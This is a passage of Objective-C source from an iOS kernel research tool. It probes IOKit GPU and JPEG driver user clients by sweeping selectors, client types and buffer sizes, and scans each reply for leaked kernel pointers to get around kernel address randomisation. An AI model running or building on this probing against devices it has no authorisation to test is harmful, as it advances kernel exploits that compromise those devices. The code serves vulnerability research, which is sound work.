    else if (kr == 0xe00002c7) verdict = "Unsupported";
    else if (kr == 0xe00002e2) verdict = "NotPermitted";
    else if (kr == 0xe00002bd) verdict = "NoMemory";
    else if (kr == 0xe00002c8) verdict = "IPCError";
    else verdict = "Err";
    char ptrs[512];
    int hits = outLen ? ss_scan_ptrs(outBuf, outLen, ptrs, sizeof(ptrs)) : 0;
    ss_emit(@"[sel %2u] %-12s kr=0x%x si=%u szi=%@ so=%u szo=%@ -> outLen=%zu ptrs=%d%@",
            r->sel, verdict, kr,
            si, szi == SSZ ? @"var" : [NSString stringWithFormat:@"%u", szi],
            so, szo == SSZ ? @"var" : [NSString stringWithFormat:@"%u", szo],
            outLen, hits,
            hits ? [NSString stringWithFormat:@" %@", [NSString stringWithUTF8String:ptrs]] : @"");
    if (kr == 0 && outLen) {
        ss_dump_bytes([NSString stringWithFormat:@"sel %u out", r->sel], outBuf, outLen);
        // non-zero u32 map for the tail only (0x00-0x90 dumped above)
        if (outLen > 0x90) {
            NSMutableString *nz = [NSMutableString string];
            for (size_t i = 0x90; i + 4 <= outLen; i += 4) {
                uint32_t v = rd32(outBuf + i);
                if (v) [nz appendFormat:@"+0x%zx=0x%08x ", i, v];
            }
            if (nz.length) ss_emit(@"[sel %u] tail non-zero u32: %@", r->sel, nz);
        }
    }
    if (kr == 0 && so) {
        NSMutableString *sv = [NSMutableString string];
        for (uint32_t i = 0; i < so; i++) [sv appendFormat:@"sc[%u]=0x%016llx ", i, scOut[i]];
        ss_emit(@"[sel %u] scalars: %@", r->sel, sv);
    }
    return kr;
}

static void selscan_loop_inner(void) {
    if (!gSSLock) gSSLock = [[NSLock alloc] init];
    if (!gSSPath && gRunDir) gSSPath = [gRunDir stringByAppendingPathComponent:@"selscan.txt"];
    gSSFile = gSSPath ? fopen(gSSPath.fileSystemRepresentation, "a") : NULL;
    if (gSSFile) setvbuf(gSSFile, NULL, _IOLBF, 0);
    ss_emit(@"[SELSCAN] === KRWProbe %@ selscan %@ ===", app_version(), [NSDate date]);
    ss_emit(@"[SELSCAN] ABI: exact sMethods counts (DISPATCHER_RE.md); var-in=0x100 "
             "(sel13=0x210 with tail name), var-out=0x800 prefill 0xA5, scalarOut=8. "
             "structOut tails (>=0x90) are scanned for kernel pointers.");
    io_connect_t conn = leak_open_conn();
    if (!conn) { ss_emit(@"[SELSCAN] no connection"); if (gSSFile) { fclose(gSSFile); gSSFile=NULL; } return; }

    uint8_t *inBuf = (uint8_t *)calloc(1, 0x400);
    uint8_t *outBuf = (uint8_t *)calloc(1, 0x1000);
    if (!inBuf || !outBuf) {
        ss_emit(@"[SELSCAN] alloc failed");
        free(inBuf); free(outBuf); IOServiceClose(conn);
        if (gSSFile) { fclose(gSSFile); gSSFile = NULL; }
        return;
    }

    // 0xA5 prefill note: a tail byte that stays 0xA5 was not written by the
    // kernel; a byte that changed either came from kernel state or was
    // initialized.  The sel-0 create response (memset(0) by FUN_9c2c18c) is
    // the control: its tail is known-zero, so any non-zero there would be a
    // kernel write (none observed on device, run 1.7).
    int ok = 0, bad = 0;
    for (int i = 0; i < kSelCount && !gStop; i++) {
        @autoreleasepool {
            // 2.2: isolate the crash.  45-49 are pool/OOL paths with a
            // class-gate and variable descriptors; they are not part of the
            // current lead and are the most likely userland fault source.
            if (kSelTable[i].sel >= 45 && kSelTable[i].sel <= 49) {
                ss_emit(@"[SELSCAN] skip sel %u (pool/OOL, risk isolated to GATES)",
                        kSelTable[i].sel);
                continue;
            }
            ss_emit(@"[SELSCAN] call sel %u (%s)", kSelTable[i].sel, kSelTable[i].note);
            set_phase(@"SELSCAN %d/%d", i + 1, kSelCount);
            kern_return_t k = ss_probe_one(conn, &kSelTable[i], inBuf, 0x400, outBuf, 0x1000);
            if (k == 0) ok++; else bad++;
        }
    }

    ss_emit(@"[SELSCAN] summary: ok=%d err=%d stop=%d file=%@", ok, bad, gStop, gSSPath ?: @"(none)");
    free(inBuf); free(outBuf);
    IOServiceClose(conn);
    if (gSSFile) { fflush(gSSFile); fclose(gSSFile); gSSFile = NULL; }
}

static void selscan_loop(void) {
    if (gSSBusy) { L(@"[SELSCAN] already running"); return; }
    gSSBusy = 1; gStop = 0;
    @autoreleasepool { selscan_loop_inner(); }
    gSSBusy = 0;
}

// ---- GATES: client-type sweep for the services the SAFE probe could not open
static const char *gGateServices[] = {
    "AGXAcceleratorG14P",
    "AppleAVE2Driver",
    "AppleH11ANEInterface",
    "AppleM2ScalerCSCDriver",
    "AppleJPEGDriver",
    "IOGPUFamily",
};
#define kGateServiceCount ((int)(sizeof(gGateServices) / sizeof(gGateServices[0])))

// ---- 3.0: AGX type 1 / IOGPUDeviceUserClient method-table scan ----
// GATES proved AGXAcceleratorG14P type 1 opens.  Its vtable inherits
// IOGPUDeviceUserClient; the legacy 0x18 dispatch table from the IOGPU audit
// (23F84, iPhone13,4) is the best available shape.  Exact sizes, no fuzzing:
// first find which selectors answer, then fuzz only those.
typedef struct { uint8_t sel; uint32_t si, szi, so, szo; const char *note; } IOGRow;
static const IOGRow kIOGTable[] = {
    { 0, 0, 0,    0, 0x40,  "device info" },
    { 1, 0, 0,    0, 0x40,  "info variant" },
    { 2, 0, 0,    0, 0x218, "big config query" },
    { 3, 0, 0,    0, 0x8,   "query" },
    { 4, 0, 0,    0, 0x20,  "query" },
    { 5, 0, 0,    0, 0x10,  "query" },
    { 6, 0, 0x408,0, 0x10,  "create_command_queue" },
    { 7, 1, 0,    0, 0,     "id op" },
    { 8, 0, 0x100,0, 0x1000,"new_resource" },
    { 9, 1, 0,    0, 0,     "id op" },
    {10, 2, 0,    0, 0,     "id op" },
    {11, 2, 0,    1, 0,     "id op" },
    {12, 2, 0,    0, 0x10,  "id op" },
    {13, 1, 0,    0, 0,     "id op" },
    {14, 2, 0,    0, 0x10,  "id op" },
    {15, 1, 0,    0, 0,     "id op" },
    {16, 0, 0,    0, 0x8,   "query" },
    {17, 0, 0,    0, 0x4,   "event op" },
    {18, 1, 0,    0, 0,     "event op" },
    {19, 1, 0,    0, 0x18,  "query" },
    {20, 1, 0,    0, 0,     "id op" },
    {21, 0, 0,    0, 0x30,  "query" },
    {22, 0, 0,    0, 0x1000,"query var out" },
    {23, 0, 0,    1, 0,     "query" },
    {24, 2, 0,    0, 0,     "id op" },
    {25, 4, 0x400,1, 0,     "submit_command_buffers" },
    {26, 1, 0xc,  1, 0,     "op" },
    {27, 1, 0x4,  0, 0,     "op" },
    {28, 0, 0,    2, 0,     "query" },
    {29, 1, 0,    0, 0,     "id op" },
    {30, 2, 0,    0, 0,     "event op" },
    {31, 1, 0,    2, 0,     "event query" },
    {32, 2, 0,    0, 0,     "id op" },
    {33, 2, 0,    0, 0,     "id op" },
    {34, 1, 0,    1, 0,     "op" },
    {35, 2, 0,    0, 0,     "id op" },
    {36, 3, 0,    1, 0,     "op" },
    {37, 1, 0,    0, 0,     "detach" },
    {38, 0, 0x18, 0, 0,     "io op" },
    {39, 0, 0x18, 1, 0,     "replace" },
    {40, 1, 0,    2, 0,     "create_vniodesc" },
    {41, 1, 0,    0, 0,     "vnio op" },
    {42, 2, 0,    2, 0,     "create_io_command_queue" },
    {43, 1, 0,    0, 0,     "destroy_io_command_queue" },
    {44, 2, 0,    0, 0,     "set_io_notification_queue" },
    {45, 1, 0x100,0, 0,     "submit_io_commands" },
    {46, 1, 0,    2, 0,     "io-cb op" },
    {47, 2, 0,    0, 0,     "create_io_command_buffer" },
    {48, 2, 0,    0, 0,     "destroy_io_command_buffer" },
    {49, 1, 0,    0, 0,     "try_cancel_io_cb" },
    {50, 1, 0,    0, 0,     "perform_io" },
    {51, 3, 0,    0, 0,     "io_cb_complete" },
    {52, 2, 0x100,0, 0,     "group_add_resources" },
    {53, 2, 0x100,0, 0,     "group_remove_resources" },
    {54, 2, 0,    1, 0,     "io_cb_barrier_complete" },
};
#define kIOGCount ((int)(sizeof(kIOGTable) / sizeof(kIOGTable[0])))

extern kern_return_t IOConnectMapMemory64(io_connect_t connect, uint32_t memoryType,
                                          task_port_t intoTask, mach_vm_address_t *atAddress,
                                          mach_vm_size_t *ofSize, IOOptionBits options);
extern kern_return_t IOConnectUnmapMemory64(io_connect_t connect, uint32_t memoryType,
                                            task_port_t fromTask, mach_vm_address_t atAddress);

// Safe user-VA probe: ask the kernel whether the address is mapped in *our*
// task, and only then read it.  AGX sel0/2/4/5 return values in the 0x1_00...
// range; they are either user mappings of GPU shared/config pages or physical
// addresses.  This distinguishes the two without a blind dereference.
static void agx_probe_user_va(uint64_t v, const char *tag) {
    if (v < 0x10000 || v >= 0x800000000000ULL) return;
    // Only page-aligned values are plausible VAs.  Config records pack two
    // u32 (e.g. 0x0000000800000008); probing the packed qword found a 54 GB
    // region and the 3.1 read died there.  Skip unaligned combinations.
    if ((v & 0x3fff) != 0) return;
    mach_vm_address_t a = (mach_vm_address_t)v;
    mach_vm_size_t s = 0;
    vm_region_basic_info_data_64_t info;
    mach_msg_type_number_t cnt = VM_REGION_BASIC_INFO_COUNT_64;
    mach_port_t obj = MACH_PORT_NULL;
    memset(&info, 0, sizeof(info));
    kern_return_t kr = mach_vm_region(mach_task_self(), &a, &s,
                                      VM_REGION_BASIC_INFO_64,
                                      (vm_region_info_t)&info, &cnt, &obj);
    if (obj != MACH_PORT_NULL) mach_port_deallocate(mach_task_self(), obj);
    if (kr != KERN_SUCCESS) {
        ss_emit(@"[AGX] %s VA 0x%016llx -> mach_vm_region 0x%x (not in task)",
                tag, (unsigned long long)v, kr);
        return;
    }
    ss_emit(@"[AGX] %s VA 0x%016llx -> region 0x%llx+0x%llx prot=0x%x",
            tag, (unsigned long long)v, (unsigned long long)a,
            (unsigned long long)s, info.protection);
    // Read only a small, bounded mapping that actually contains the address.
    // A 54 GB region means the value is not a user VA; 3.1 dereferenced one
    // and died.  Anything above 0x40000 is reported, never touched.
    if (s > 0x40000) {
        ss_emit(@"[AGX] %s VA 0x%llx region too large, no read", tag,
                (unsigned long long)v);
        return;
    }
    if (v >= a && s >= (v - a) + 0x40) {
        uint8_t b[0x40];
        memcpy(b, (const void *)(uintptr_t)v, sizeof(b));
        ss_dump_bytes([NSString stringWithFormat:@"AGX %s VA", tag], b, sizeof(b));
        char ptrs[512];
        int hits = ss_scan_ptrs(b, sizeof(b), ptrs, sizeof(ptrs));
        if (hits) ss_emit(@"[AGX] %s VA 0x%llx KPTR %@", tag,
                          (unsigned long long)v, [NSString stringWithUTF8String:ptrs]);
    }
}

// 3.3: sel8 with a REAL IOSurface.  From the 27.2 handler
// (dumps/iogpu272/fn_fffffff0099669e0.c): resType 0x82 = IOSurface, surface id
// at +0x38, plane at +0x3c, input must be >= 0x58 and output >= dev[0x234]+0x58.
// On success the driver writes a GPU VA (low 32 | input[0x34]<<32) at out+0x00,
// a length at out+0x50 and a resource id at out+0x28.  That GPU VA is the
// first real address this campaign can obtain without KASLR.
static IOSurfaceRef agx_make_surface(void) {
    NSDictionary *p = @{ @"IOSurfaceWidth": @(64), @"IOSurfaceHeight": @(64),
                         @"IOSurfaceBytesPerElement": @(4),
                         @"IOSurfacePixelFormat": @(0x42475241),
                         @"IOSurfaceAllocSize": @(0x4000) };
    IOSurfaceRef s = IOSurfaceCreate((__bridge CFDictionaryRef)p);
    if (!s) s = IOSurfaceCreate((__bridge CFDictionaryRef)base_props(64, 64));
    return s;
}

static void agx_new_resource_probe(void) {
    IOSurfaceRef surf = agx_make_surface();
    if (!surf) { ss_emit(@"[AGX8] IOSurfaceCreate failed"); return; }
    IOSurfaceID sid = IOSurfaceGetID(surf);
    void *sbase = IOSurfaceGetBaseAddress(surf);
    ss_emit(@"[AGX8] surface id=%u base=%p alloc=0x%zx", sid, sbase,
            (size_t)IOSurfaceGetAllocSize(surf));
    if (sbase) {
        memset(sbase, 0x5A, 0x40);
        ss_emit(@"[AGX8] surface bytes set to 5A at %p", sbase);
    }

    io_service_t svc = IOServiceGetMatchingService(kIOMasterPortDefault,
                                                   IOServiceMatching("AGXAcceleratorG14P"));
    if (!svc) { ss_emit(@"[AGX8] no service"); CFRelease(surf); return; }
    io_connect_t c = 0;
    kern_return_t kr = IOServiceOpen(svc, mach_task_self(), 1, &c);
    IOObjectRelease(svc);
    ss_emit(@"[AGX8] open type 1 -> 0x%x conn=0x%x", kr, c);
    if (kr != KERN_SUCCESS) { CFRelease(surf); return; }

    uint8_t in[0x100], out[0x1000];
    memset(in, 0, sizeof(in));
    memset(out, 0xA5, sizeof(out));          // marker: what the kernel really writes
    uint32_t *w = (uint32_t *)in;
    w[0]  = 0x82;                            // resType: IOSurface
    w[1]  = 0;                               // cache mode
    w[0xc] = 1;                              // minimum span
    w[0xd] = 0;                              // high 32 of returned GPU VA
    w[0xe] = sid;                            // IOSurface ID
    w[0xf] = 0;                              // plane
    w[0x14] = 0;                             // parent resource id / suballoc

    size_t olen = sizeof(out);
    kr = IOConnectCallMethod(c, 8, NULL, 0, in, sizeof(in),
                             NULL, NULL, out, &olen);
    ss_emit(@"[AGX8] sel8 -> 0x%x outLen=%zu", kr, olen);
    ss_dump_bytes(@"AGX8 sel8 out", out, olen > 0x100 ? 0x100 : olen);
    {
        uint64_t v[12]; memcpy(v, out, sizeof(v));
        ss_emit(@"[AGX8] q: %llx %llx %llx %llx %llx %llx",
                (unsigned long long)v[0], (unsigned long long)v[1],
                (unsigned long long)v[2], (unsigned long long)v[3],
                (unsigned long long)v[4], (unsigned long long)v[5]);
        ss_emit(@"[AGX8] q6..11: %llx %llx %llx %llx %llx %llx",
                (unsigned long long)v[6], (unsigned long long)v[7],
                (unsigned long long)v[8], (unsigned long long)v[9],
                (unsigned long long)v[10], (unsigned long long)v[11]);
    }
    char ptrs[768];
    int hits = ss_scan_all64(out, olen > 0x100 ? 0x100 : olen, ptrs, sizeof(ptrs));
    ss_emit(@"[AGX8] kernel pointers in sel8 out: %d%@", hits,
            hits ? [NSString stringWithFormat:@" %@", [NSString stringWithUTF8String:ptrs]] : @"");

    IOServiceClose(c);
    CFRelease(surf);
}

// 3.8: AppleJPEGDriverUserClient real ABI.  Dispatch table found at
// 0xfffffff007e293c0, stride 0x28 (IOExternalMethodDispatch2022), 10 entries:
//   sel0  in 0x0    out 0x0
//   sel1  in 0x58   out 0x58
//   sel2  in 0x0    out 0x0
//   sel3  in 0x58   out 0x58
//   sel4  in 0x1000 out 0x1000
//   sel5  in 0x1000 out 0x1000
//   sel6  in 0xda0  out 0xda0   (d1=1)
//   sel7  in 0xda0  out 0xda0   (d1=1)
//   sel8  in 0x4    out 0x0
// The 3.3 sweep used szo=0x400 for every selector, so every size check failed.
static void jpeg_call(io_connect_t c, uint32_t sel, size_t szi, size_t szo) {
    uint8_t *in = (uint8_t *)calloc(1, szi ? szi : 1);
    uint8_t *out = (uint8_t *)malloc(szo ? szo : 1);
    if (!out) { free(in); return; }
    memset(out, 0xA5, szo ? szo : 1);
    size_t olen = szo;
    kern_return_t kr = IOConnectCallMethod(c, sel, NULL, 0,
                                           szi ? in : NULL, szi,
                                           NULL, NULL, szo ? out : NULL,
                                           szo ? &olen : NULL);
    int touched = 0;
    for (size_t i = 0; i < szo; i++) if (out[i] != 0xA5) { touched = 1; break; }
    char ptrs[768];
    int hits = szo ? ss_scan_all64(out, szo, ptrs, sizeof(ptrs)) : 0;
    ss_emit(@"[JPEG] sel %u szi=0x%zx szo=0x%zx -> 0x%x olen=0x%zx touched=%d kptr=%d%@",
            sel, szi, szo, kr, olen, touched, hits,
            hits ? [NSString stringWithFormat:@" %@", [NSString stringWithUTF8String:ptrs]] : @"");
    if (touched) ss_dump_bytes([NSString stringWithFormat:@"JPEG sel %u out", sel],
                               out, olen > 0x100 ? 0x100 : olen);
    if (kr == 0 && szo >= 8) {
        uint64_t v[8]; memcpy(v, out, sizeof(v));
        ss_emit(@"[JPEG] sel %u q: %llx %llx %llx %llx", sel,
                (unsigned long long)v[0], (unsigned long long)v[1],
                (unsigned long long)v[2], (unsigned long long)v[3]);
    }
    free(in); free(out);
}

// 3.9: sel1/sel3 take a 0x58 request.  Disassembly of the handler at
// 0xfffffff008c85520 shows it copies {q0 at +0x30} and {x8 at +0x40} into a
// request object, and reads +0x00/+0x08/+0x14/+0x18/+0x20/+0x2c/+0x48/+0x4c.
// 0xe00002cc (CannotLock) is the descriptor path failing.  Try the plausible
// {ptr,len} and {len,ptr} conventions against a real page-aligned buffer.
// 3.10: the 16-byte field at +0x30 may be {IOSurfaceID, plane} rather than
// {address,length}; JPEG on iOS normally encodes from a surface.  Also sweep
// +0x2c (format/mode) because the handler branches on 1..4.
// 3.11: every JPEG call in one connection returned the same 0x2cc, including
// calls that never touched the request fields.  That smells like per-client
// state (sel0/sel2 may be session open/close).  Open a fresh connection per
// client type and issue exactly one request, nothing before it.
static void jpeg_fresh_probe(void) {
    io_service_t svc = IOServiceGetMatchingService(kIOMasterPortDefault,
                                                   IOServiceMatching("AppleJPEGDriver"));
    if (!svc) return;
    for (uint32_t type = 0; type <= 3 && !gStop; type++) {
        io_connect_t c = 0;
        kern_return_t kr = IOServiceOpen(svc, mach_task_self(), type, &c);
        if (kr != KERN_SUCCESS) {
            ss_emit(@"[JPEGF] type %u open -> 0x%x", type, kr);
            continue;
        }
        uint8_t in[0x58], out[0x58];
        memset(in, 0, sizeof(in));
        memset(out, 0xA5, sizeof(out));
        size_t olen = sizeof(out);
        kr = IOConnectCallMethod(c, 1, NULL, 0, in, sizeof(in), NULL, NULL, out, &olen);
        ss_emit(@"[JPEGF] type %u sel1 only -> 0x%x", type, kr);

        uint8_t zin[0x58], zout[0x58];
        memset(zin, 0, sizeof(zin)); memset(zout, 0xA5, sizeof(zout));
        olen = sizeof(zout);
        ss_emit(@"[JPEGF] type %u sel0 then sel1 -> 0x%x / 0x%x", type,
                IOConnectCallMethod(c, 0, NULL, 0, NULL, 0, NULL, NULL, NULL, NULL),
                IOConnectCallMethod(c, 1, NULL, 0, zin, sizeof(zin), NULL, NULL, zout, &olen));

        uint8_t sin[0x1000], sout[0x1000];
        memset(sin, 0, sizeof(sin)); memset(sout, 0xA5, sizeof(sout));
        olen = sizeof(sout);
        ss_emit(@"[JPEGF] type %u sel5 -> 0x%x", type,
                IOConnectCallMethod(c, 5, NULL, 0, sin, sizeof(sin), NULL, NULL, sout, &olen));
        IOServiceClose(c);
    }
    IOObjectRelease(svc);
}

static void jpeg_surface_probe(io_connect_t c) {
    IOSurfaceRef surf = agx_make_surface();
    uint32_t sid = surf ? IOSurfaceGetID(surf) : 0;
    ss_emit(@"[JPEGS] surface id=%u", sid);

    for (uint32_t mode = 0; mode <= 4 && !gStop; mode++) {
        uint8_t in[0x58], out[0x58];
        memset(in, 0, sizeof(in));
        memset(out, 0xA5, sizeof(out));
        *(uint32_t*)(in + 0x2c) = mode;
        size_t olen = sizeof(out);
        kern_return_t kr = IOConnectCallMethod(c, 1, NULL, 0, in, sizeof(in),
                                               NULL, NULL, out, &olen);
        ss_emit(@"[JPEGS] sel1 mode=%u -> 0x%x", mode, kr);
    }

    if (surf) {
        struct { const char *n; uint32_t off; uint32_t plane; uint64_t extra; } v[] = {
            { "sid@30 plane@34", 0x30, 0, 0 },
            { "sid@30 plane@34 len@38", 0x30, 0, 0x4000 },
            { "sid@34 plane@38", 0x34, 0, 0 },
            { "sid@38", 0x38, 0, 0 },
        };
        for (unsigned i = 0; i < sizeof(v)/sizeof(v[0]); i++) {
            uint8_t in[0x58], out[0x58];
            memset(in, 0, sizeof(in));
            memset(out, 0xA5, sizeof(out));
            *(uint32_t*)(in + v[i].off) = sid;
            *(uint32_t*)(in + v[i].off + 4) = v[i].plane;
            if (v[i].extra) *(uint64_t*)(in + 0x38) = v[i].extra;
            *(uint32_t*)(in + 0x2c) = 1;
            size_t olen = sizeof(out);
            kern_return_t kr = IOConnectCallMethod(c, 1, NULL, 0, in, sizeof(in),
                                                   NULL, NULL, out, &olen);
            ss_emit(@"[JPEGS] sel1 %s -> 0x%x", v[i].n, kr);
        }
    }
    if (surf) CFRelease(surf);
}

static void jpeg_request_probe(io_connect_t c, uint32_t sel) {
    void *buf = NULL;
    posix_memalign(&buf, 0x4000, 0x4000);
    if (!buf) return;
    memset(buf, 0x41, 0x4000);

    struct { const char *name; int mode; } vars[] = {
        { "zeros",          0 },
        { "ptr@30 len@38",  1 },
        { "len@30 ptr@38",  2 },
        { "ptr@30 len@40",  3 },
        { "dims+ptr@30",    4 },
    };
    for (unsigned v = 0; v < sizeof(vars)/sizeof(vars[0]); v++) {
        uint8_t in[0x58], out[0x58];
        memset(in, 0, sizeof(in));
        memset(out, 0xA5, sizeof(out));
        uint64_t ptr = (uint64_t)(uintptr_t)buf;
        switch (vars[v].mode) {
        case 1: *(uint64_t*)(in+0x30) = ptr; *(uint64_t*)(in+0x38) = 0x4000; break;
        case 2: *(uint64_t*)(in+0x30) = 0x4000; *(uint64_t*)(in+0x38) = ptr; break;
        case 3: *(uint64_t*)(in+0x30) = ptr; *(uint64_t*)(in+0x40) = 0x4000; break;
        case 4:
            *(uint32_t*)(in+0x14) = 64;      // width
            *(uint16_t*)(in+0x18) = 64;      // height
            *(uint32_t*)(in+0x2c) = 1;       // format/mode
            *(uint32_t*)(in+0x48) = 0x4000;  // size
            *(uint64_t*)(in+0x30) = ptr;
            *(uint64_t*)(in+0x38) = 0x4000;
            break;
        default: break;
        }
        size_t olen = sizeof(out);
        kern_return_t kr = IOConnectCallMethod(c, sel, NULL, 0, in, sizeof(in),
                                               NULL, NULL, out, &olen);
        int touched = 0;
        for (size_t i = 0; i < sizeof(out); i++) if (out[i] != 0xA5) { touched = 1; break; }
        char ptrs[512];
        int hits = ss_scan_all64(out, sizeof(out), ptrs, sizeof(ptrs));
        ss_emit(@"[JPEGR] sel %u %s -> 0x%x touched=%d kptr=%d%@", sel, vars[v].name,
                kr, touched, hits,
                hits ? [NSString stringWithFormat:@" %@", [NSString stringWithUTF8String:ptrs]] : @"");
        if (touched) ss_dump_bytes(@"JPEGR out", out, sizeof(out));
    }
    free(buf);
}

static void jpeg_leak_probe(void) {
    io_service_t svc = IOServiceGetMatchingService(kIOMasterPortDefault,
                                                   IOServiceMatching("AppleJPEGDriver"));
    if (!svc) { ss_emit(@"[JPEG] no service"); return; }
    io_connect_t c = 0;
    kern_return_t kr = IOServiceOpen(svc, mach_task_self(), 0, &c);
    IOObjectRelease(svc);
    ss_emit(@"[JPEG] open type 0 -> 0x%x", kr);
    if (kr != KERN_SUCCESS) return;

    jpeg_call(c, 0, 0, 0);
    jpeg_call(c, 1, 0x58, 0x58);
    jpeg_call(c, 2, 0, 0);
    jpeg_call(c, 3, 0x58, 0x58);
    jpeg_call(c, 8, 4, 0);
    jpeg_call(c, 4, 0x1000, 0x1000);
    jpeg_call(c, 5, 0x1000, 0x1000);
    jpeg_call(c, 6, 0xda0, 0xda0);
    jpeg_call(c, 7, 0xda0, 0xda0);
    jpeg_call(c, 9, 0, 0);

    ss_emit(@"[JPEGR] request-convention probe");
    jpeg_request_probe(c, 1);
    jpeg_request_probe(c, 3);
    jpeg_surface_probe(c);
    jpeg_fresh_probe();

    IOServiceClose(c);
}

// 3.8: sel6 rejected every size in 0x408..0x1000.  The handler compares
// structureInputSize against a value read from the AGX object at +0x4f, and
// the object layout differs from IOGPUDevice, so the constant may be large.
// Sweep the full plausible range at 8-byte granularity; nothing is allocated
// until an exact match, so the whole loop is cheap and side-effect free.
static void agx_cmd_queue_sweep2(void) {
    io_service_t svc = IOServiceGetMatchingService(kIOMasterPortDefault,
                                                   IOServiceMatching("AGXAcceleratorG14P"));
    if (!svc) return;
    io_connect_t c = 0;
    if (IOServiceOpen(svc, mach_task_self(), 1, &c) != KERN_SUCCESS) { IOObjectRelease(svc); return; }
    IOObjectRelease(svc);

    uint8_t *buf = (uint8_t *)calloc(1, 0x8000);
    for (uint32_t sz = 0x408; sz <= 0x8000; sz += 8) {
        uint64_t o[2] = {0, 0}; uint32_t oc = 2;
        kern_return_t kr = IOConnectCallMethod(c, 6, NULL, 0, buf, sz,
                                               o, &oc, NULL, NULL);
        if (kr == 0) {
            ss_emit(@"[AGXQ9] sel6 OK size=0x%x id=%llu serial=%llx", sz,
                    (unsigned long long)o[0], (unsigned long long)o[1]);
            free(buf);
            IOServiceClose(c);
            return;
        }
    }
    ss_emit(@"[AGXQ9] sel6 sweep 0x408..0x8000: no size accepted");
    free(buf);
    IOServiceClose(c);
}

static void agx_map_probe(void) {
    io_service_t svc = IOServiceGetMatchingService(kIOMasterPortDefault,
                                                   IOServiceMatching("AGXAcceleratorG14P"));
    if (!svc) return;
    io_connect_t c = 0;
    if (IOServiceOpen(svc, mach_task_self(), 1, &c) != KERN_SUCCESS) {
        IOObjectRelease(svc);
        return;
    }
    IOObjectRelease(svc);
    uint64_t out[0x218 / 8];
    size_t olen = sizeof(out);
    kern_return_t kr = IOConnectCallMethod(c, 2, NULL, 0, NULL, 0,
                                           NULL, NULL, out, &olen);
    ss_emit(@"[AGX] map sel2 -> 0x%x len=%zu", kr, olen);
    if (kr == 0) {
        // sel2 is the device config; dump the first 0x218 bytes and probe
        // every qword that could be a user VA.
        ss_dump_bytes(@"AGX sel2 config", (const uint8_t *)out, olen > 0x100 ? 0x100 : olen);
        int probes = 0;
        for (size_t i = 0; i + 8 <= olen && probes < 24; i += 8) {
            uint64_t v = out[i / 8];
            if (v >= 0x100000000ULL && v < 0x800000000000ULL) {
                agx_probe_user_va(v, "sel2");
                probes++;
            }
        }
    }
    uint64_t o4[0x20 / 8]; olen = sizeof(o4);
    if (IOConnectCallMethod(c, 4, NULL, 0, NULL, 0, NULL, NULL, o4, &olen) == 0) {
        for (size_t i = 0; i + 8 <= olen; i += 8) agx_probe_user_va(o4[i / 8], "sel4");
    }
    uint64_t o5[0x10 / 8]; olen = sizeof(o5);
    if (IOConnectCallMethod(c, 5, NULL, 0, NULL, 0, NULL, NULL, o5, &olen) == 0) {
        for (size_t i = 0; i + 8 <= olen; i += 8) agx_probe_user_va(o5[i / 8], "sel5");
    }
    IOServiceClose(c);
}

static void agx_type1_scan(void) {
    io_service_t svc = IOServiceGetMatchingService(kIOMasterPortDefault,
                                                   IOServiceMatching("AGXAcceleratorG14P"));
    if (!svc) { ss_emit(@"[AGX] no service"); return; }
    io_connect_t c = 0;
    kern_return_t kr = IOServiceOpen(svc, mach_task_self(), 1, &c);
    IOObjectRelease(svc);
    ss_emit(@"[AGX] open type 1 -> 0x%x conn=0x%x", kr, c);
    if (kr != KERN_SUCCESS) return;

    uint8_t *in = (uint8_t *)calloc(1, 0x1000);
    uint8_t *out = (uint8_t *)calloc(1, 0x1000);
    if (!in || !out) { ss_emit(@"[AGX] alloc failed"); IOServiceClose(c); return; }
    int ok = 0, bad = 0;
    for (int i = 0; i < kIOGCount && !gStop; i++) {
        const IOGRow *r = &kIOGTable[i];
        memset(in, 0, 0x1000);
        memset(out, 0, 0x1000);
        uint64_t scIn[8] = {0}, scOut[8] = {0};
        size_t inLen = r->szi, outLen = r->szo;
        if (inLen > 0x1000) inLen = 0x1000;
        if (outLen > 0x1000) outLen = 0x1000;
        ss_emit(@"[AGX] call sel %u (%s) si=%u szi=%zu so=%u szo=%zu",
                r->sel, r->note, r->si, inLen, r->so, outLen);
        uint32_t outCnt = r->so;
        kr = IOConnectCallMethod(c, r->sel,
                                 r->si ? scIn : NULL, r->si,
                                 inLen ? in : NULL, inLen,
                                 r->so ? scOut : NULL, r->so ? &outCnt : NULL,
                                 outLen ? out : NULL, outLen ? &outLen : NULL);
        if (kr == 0) ok++; else bad++;
        char ptrs[512];
        int hits = outLen ? ss_scan_ptrs(out, outLen, ptrs, sizeof(ptrs)) : 0;
        ss_emit(@"[AGX] sel %u -> kr=0x%x outLen=%zu ptrs=%d%@",
                r->sel, kr, outLen, hits,
                hits ? [NSString stringWithFormat:@" %@", [NSString stringWithUTF8String:ptrs]] : @"");
        if (kr == 0 && r->so) {
            NSMutableString *sv = [NSMutableString string];
            for (uint32_t k = 0; k < r->so; k++) [sv appendFormat:@"sc[%u]=0x%016llx ", k, scOut[k]];
            ss_emit(@"[AGX] sel %u scalars: %@", r->sel, sv);
        }
        if (kr == 0 && outLen) ss_dump_bytes([NSString stringWithFormat:@"AGX sel %u out", r->sel], out, outLen > 0x80 ? 0x80 : outLen);
    }
    ss_emit(@"[AGX] table done: ok=%d err=%d", ok, bad);

    for (uint32_t t = 0; t <= 8 && !gStop; t++) {
        mach_vm_address_t addr = 0;
        mach_vm_size_t size = 0x4000;
        kr = IOConnectMapMemory64(c, t, mach_task_self(), &addr, &size, 1);
        if (kr == 0 && addr) {
            char ptrs[512];
            int hits = ss_scan_ptrs((const uint8_t *)(uintptr_t)addr, (size_t)size, ptrs, sizeof(ptrs));
            ss_emit(@"[AGX] map type %u -> addr=0x%llx size=0x%llx ptrs=%d%@",
                    t, (unsigned long long)addr, (unsigned long long)size, hits,
                    hits ? [NSString stringWithFormat:@" %@", [NSString stringWithUTF8String:ptrs]] : @"");
            IOConnectUnmapMemory64(c, t, mach_task_self(), addr);
        } else {
            ss_emit(@"[AGX] map type %u -> 0x%x", t, kr);
        }
    }
    free(in); free(out);
    IOServiceClose(c);
}

static void gates_loop_inner(void) {
    ss_emit(@"[GATES] === KRWProbe %@ gates %@ ===", app_version(), [NSDate date]);
    ss_emit(@"[GATES] IOServiceOpen client types 0-8 per service; goal: split "
             "sandbox refusal (0xe00002e2) from client-type refusal (0xe00002c7) "
             "and from driver-internal failures (0xe00002bd).");
    for (int s = 0; s < kGateServiceCount && !gStop; s++) {
        @autoreleasepool {
            io_service_t svc = IOServiceGetMatchingService(kIOMasterPortDefault,
                IOServiceMatching(gGateServices[s]));
